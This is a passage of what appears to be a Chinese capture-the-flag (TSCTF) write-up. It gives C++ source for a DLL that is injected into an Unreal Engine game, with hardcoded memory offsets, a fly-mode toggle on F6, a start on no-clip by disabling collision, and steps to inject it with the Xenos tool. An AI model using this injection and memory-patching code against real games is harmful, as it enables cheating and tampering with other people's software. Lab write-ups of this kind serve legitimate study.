class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BasicType.h&quot;</span>   <span class="comment">// UEDumper 导出的基础类型，提供 TArray 等模板</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 简易前向声明 -----------------------------------------------------------</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UWorld</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UGameInstance</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ULocalPlayer</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APlayerController</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APawn</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ACharacter</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UCharacterMovementComponent</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">FVector</span> &#123; <span class="type">float</span> X, Y, Z; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 之前我们发现的状态</span></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">EMovementMode</span> : <span class="type">uint8_t</span> &#123;</span><br><span class="line">    MOVE_None = <span class="number">0</span>,</span><br><span class="line">    MOVE_Walking = <span class="number">1</span>,</span><br><span class="line">    MOVE_NavWalking,</span><br><span class="line">    MOVE_Falling,</span><br><span class="line">    MOVE_Swimming,</span><br><span class="line">    MOVE_Flying,</span><br><span class="line">    MOVE_Custom</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 偏移常量（来自 merged_AudioMixer_Engine_UMG_MovieScene_MovieSceneTracks.h） ---</span></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">uintptr_t</span> OFFSET_GWORLD = <span class="number">0x49EE370</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UWORLD_OWNING_GI = <span class="number">0x180</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UGAMEINSTANCE_LOCALPLAYERS = <span class="number">0x38</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ULOCALPLAYER_PLAYERCONTROLLER = <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_APLAYERCONTROLLER_ACKPAWN = <span class="number">0x2A0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ACHARACTER_CHARACTERMOVEMENT = <span class="number">0x288</span>;          <span class="comment">// 角色移动</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_MOVEMENTMODE = <span class="number">0x168</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE = <span class="number">0x384</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_PENDINGLAUNCHVELOC = <span class="number">0x3C0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_LASTUPDATEVELOC = <span class="number">0x25C</span>; <span class="comment">// LastUpdateVelocity</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 全局状态 ---------------------------------------------------------------</span></span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_running&#123; <span class="literal">true</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_flyEnabled&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 便捷访问函数 -----------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">uintptr_t</span> <span class="title">GetModuleBase</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">static</span> <span class="type">uintptr_t</span> base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uintptr_t</span>&gt;(::<span class="built_in">GetModuleHandleW</span>(<span class="literal">nullptr</span>));</span><br><span class="line">    <span class="keyword">return</span> base;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 根据偏移找GWorld</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UWorld* <span class="title">GetWorld</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UWorld**&gt;(<span class="built_in">GetModuleBase</span>() + OFFSET_GWORLD);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取实例，拿本地玩家列表，我们要拿[0]</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UGameInstance* <span class="title">GetGameInstance</span><span class="params">(UWorld* world)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!world) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UGameInstance**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(world) + OFFSET_UWORLD_OWNING_GI);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> TArray&lt;ULocalPlayer*&gt;&amp; <span class="title">GetLocalPlayers</span><span class="params">(UGameInstance* gi)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="keyword">reinterpret_cast</span>&lt;TArray&lt;ULocalPlayer*&gt;*&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(gi) + OFFSET_UGAMEINSTANCE_LOCALPLAYERS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> APlayerController* <span class="title">GetPlayerController</span><span class="params">(ULocalPlayer* lp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;APlayerController**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(lp) + OFFSET_ULOCALPLAYER_PLAYERCONTROLLER);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这一帧实际被控制的 Pawn，拿到这个指针就能访问 ACharacter</span></span><br><span class="line"><span class="function"><span class="keyword">inline</span> ACharacter* <span class="title">GetAcknowledgedCharacter</span><span class="params">(APlayerController* pc)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;ACharacter**&gt;(<span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(pc) + OFFSET_APLAYERCONTROLLER_ACKPAWN);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> UCharacterMovementComponent* <span class="title">GetCharacterMovement</span><span class="params">(ACharacter* character)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> *<span class="built_in">reinterpret_cast</span>&lt;UCharacterMovementComponent**&gt;(</span><br><span class="line">        <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(character) + OFFSET_ACHARACTER_CHARACTERMOVEMENT);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 写飞行相关字段 ---------------------------------------------------------</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">ApplyFlyState</span><span class="params">(UCharacterMovementComponent* movement, <span class="type">bool</span> enable)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; defaultLandMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; pendingLaunchVelocity = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_PENDINGLAUNCHVELOC);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVelocity = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELOC);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (enable) &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">        defaultLandMode = EMovementMode::MOVE_Flying;</span><br><span class="line">        pendingLaunchVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">800.f</span> &#125;;</span><br><span class="line">        lastUpdateVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">600.f</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        movementMode = EMovementMode::MOVE_Walking;</span><br><span class="line">        defaultLandMode = EMovementMode::MOVE_Walking;</span><br><span class="line">        pendingLaunchVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">        lastUpdateVelocity = &#123; <span class="number">0.f</span>, <span class="number">0.f</span>, <span class="number">0.f</span> &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 持续维持飞行状态，防止游戏自动还原</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">SustainFly</span><span class="params">(UCharacterMovementComponent* movement)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!movement) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="type">uint8_t</span>* base = <span class="built_in">reinterpret_cast</span>&lt;<span class="type">uint8_t</span>*&gt;(movement);</span><br><span class="line">    <span class="keyword">auto</span>&amp; movementMode = *<span class="built_in">reinterpret_cast</span>&lt;EMovementMode*&gt;(base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE);</span><br><span class="line">    <span class="keyword">auto</span>&amp; lastUpdateVelocity = *<span class="built_in">reinterpret_cast</span>&lt;FVector*&gt;(base + OFFSET_UCHARMOVEMENT_LASTUPDATEVELOC);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// movementMode 本质是 *(EMovementMode*)(base + 0x168) 的别名,base 指向 UCharacterMovementComponent 的起始地址. base + OFFSET_UCHARMOVEMENT_MOVEMENTMODE 跳到 MovementMode 字段； reinterpret_cast&lt;EMovementMode*&gt; 把那块内存视为 EMovementMode * ；</span></span><br><span class="line">    <span class="comment">// 通过引用赋值 movementMode = EMovementMode::MOVE_Flying; 就是把那 1 字节的内存直接写成飞行枚举。</span></span><br><span class="line">    movementMode = EMovementMode::MOVE_Flying;</span><br><span class="line">    <span class="keyword">if</span> (lastUpdateVelocity.Z &lt; <span class="number">300.f</span>) &#123;</span><br><span class="line">        lastUpdateVelocity.Z = <span class="number">400.f</span>; <span class="comment">// 给一点上升速度</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// --- 热键线程 ---------------------------------------------------------------</span></span><br><span class="line"><span class="function">DWORD WINAPI <span class="title">FlyThread</span><span class="params">(LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">while</span> (g_running) &#123;</span><br><span class="line">        <span class="keyword">if</span> (::<span class="built_in">GetAsyncKeyState</span>(VK_F6) &amp; <span class="number">1</span>) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (!gi) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">            <span class="keyword">if</span> (!players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) || !players[<span class="number">0</span>]) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">            <span class="keyword">if</span> (!pc) <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">            <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">            g_flyEnabled = !g_flyEnabled.<span class="built_in">load</span>();</span><br><span class="line">            <span class="built_in">ApplyFlyState</span>(movement, g_flyEnabled);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">/*</span></span><br><span class="line"><span class="comment">            玩家切关、死亡重生、切换 Pawn 时，GWorld、GameInstance、LocalPlayers 乃至 AcknowledgedPawn 都可能变；如果只在按热键那一刻取一次指针，等角色重建后就指向旧对象，易崩溃或写不到新角色。</span></span><br><span class="line"><span class="comment">            循环里每次重新取 GWorld→GameInstance→LocalPlayer→PlayerController→Pawn→Movement，能在状态变化时自动跟上，确保对当前角色生效，也避免解引用野指针。</span></span><br><span class="line"><span class="comment">            用 TArray::IsValidIndex 防御空指针，配合持续刷新 MovementMode 就能稳定维持飞行。</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line">        <span class="keyword">if</span> (g_flyEnabled) &#123;</span><br><span class="line">            UWorld* world = <span class="built_in">GetWorld</span>();</span><br><span class="line">            <span class="keyword">auto</span> gi = <span class="built_in">GetGameInstance</span>(world);</span><br><span class="line">            <span class="keyword">if</span> (gi) &#123;</span><br><span class="line">                <span class="keyword">auto</span>&amp; players = <span class="built_in">GetLocalPlayers</span>(gi);</span><br><span class="line">                <span class="keyword">if</span> (players.<span class="built_in">IsValidIndex</span>(<span class="number">0</span>) &amp;&amp; players[<span class="number">0</span>]) &#123;</span><br><span class="line">                    <span class="keyword">auto</span> pc = <span class="built_in">GetPlayerController</span>(players[<span class="number">0</span>]);</span><br><span class="line">                    <span class="keyword">if</span> (pc) &#123;</span><br><span class="line">                        <span class="keyword">auto</span> character = <span class="built_in">GetAcknowledgedCharacter</span>(pc);</span><br><span class="line">                        <span class="keyword">auto</span> movement = <span class="built_in">GetCharacterMovement</span>(character);</span><br><span class="line">                        <span class="built_in">SustainFly</span>(movement);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        std::this_thread::<span class="built_in">sleep_for</span>(std::chrono::<span class="built_in">milliseconds</span>(<span class="number">20</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE <span class="keyword">module</span>, DWORD reason, LPVOID)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (reason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        ::<span class="built_in">DisableThreadLibraryCalls</span>(<span class="keyword">module</span>);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">MessageBoxW</span>(<span class="literal">nullptr</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF DLL 注入成功\nF6 切换飞行模式&quot;</span>,</span><br><span class="line">            <span class="string">L&quot;TSCTF Helper&quot;</span>,</span><br><span class="line">            MB_OK | MB_ICONINFORMATION);</span><br><span class="line"></span><br><span class="line">        ::<span class="built_in">CreateThread</span>(<span class="literal">nullptr</span>, <span class="number">0</span>, FlyThread, <span class="literal">nullptr</span>, <span class="number">0</span>, <span class="literal">nullptr</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (reason == DLL_PROCESS_DETACH) &#123;</span><br><span class="line">        g_running = <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>visual studio新建dll项目</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014221722121.png" alt="image-20251014221722121"></p><p>注意引如BasicType.h</p><p>然后生成项目</p><p>relase x64</p><p>然后找工具注入</p><p>如：</p><p><a href="https://github.com/DarthTon/Xenos">DarthTon&#x2F;Xenos: Windows dll injector</a></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014211218244.png" alt="image-20251014211218244"></p><p>注入即可</p><p>按F6起飞</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014211202488.png"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014211105377.png" alt="image-20251014211105377"></p><p>这里再添加一个脚本兼容穿墙和起飞</p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014222324466.png" alt="image-20251014222324466"></p><p><img src="https://luhaoblog.oss-cn-hangzhou.aliyuncs.com/img1/image-20251014223118044.png" alt="image-20251014223115885"></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;pch.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;atomic&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;thread&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;chrono&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&quot;BasicType.h&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UWorld</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UGameInstance</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ULocalPlayer</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APlayerController</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">APawn</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">ACharacter</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UCharacterMovementComponent</span>;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">UCapsuleComponent</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">FVector</span> &#123; <span class="type">float</span> X, Y, Z; &#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">EMovementMode</span> : <span class="type">uint8_t</span> &#123;</span><br><span class="line">    MOVE_None = <span class="number">0</span>,</span><br><span class="line">    MOVE_Walking = <span class="number">1</span>,</span><br><span class="line">    MOVE_NavWalking,</span><br><span class="line">    MOVE_Falling,</span><br><span class="line">    MOVE_Swimming,</span><br><span class="line">    MOVE_Flying,</span><br><span class="line">    MOVE_Custom</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">ECollisionEnabled</span> : <span class="type">uint8_t</span> &#123;</span><br><span class="line">    NoCollision = <span class="number">0</span>,</span><br><span class="line">    QueryOnly = <span class="number">1</span>,</span><br><span class="line">    PhysicsOnly = <span class="number">2</span>,</span><br><span class="line">    QueryAndPhysics = <span class="number">3</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">uintptr_t</span> OFFSET_GWORLD = <span class="number">0x49EE370</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UWORLD_OWNING_GI = <span class="number">0x180</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UGAMEINSTANCE_LOCALPLAYERS = <span class="number">0x38</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ULOCALPLAYER_PLAYERCONTROLLER = <span class="number">0x30</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_APLAYERCONTROLLER_ACKPAWN = <span class="number">0x2A0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ACHARACTER_MOVEMENT = <span class="number">0x288</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_ACHARACTER_CAPSULE = <span class="number">0x290</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_MOVEMENTMODE = <span class="number">0x168</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_DEFAULTLANDMODE = <span class="number">0x384</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_PENDINGLAUNCH = <span class="number">0x3C0</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UCHARMOVEMENT_LASTUPDATEVELO = <span class="number">0x25C</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_UPRIMITIVE_BODYINSTANCE = <span class="number">0x2C8</span>;</span><br><span class="line"><span class="keyword">constexpr</span> <span class="type">size_t</span>    OFFSET_FBODYINSTANCE_COLLISIONENABLED = <span class="number">0x20</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_running&#123; <span class="literal">true</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_userFly&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_autoFlyFromCollision&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"><span class="type">static</span> std::atomic&lt;<span class="type">bool</span>&gt; g_noCollision&#123; <span class="literal">false</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">inline</span> <span class="type">uintptr_t</span> <span class="title">GetModuleBase</span><span 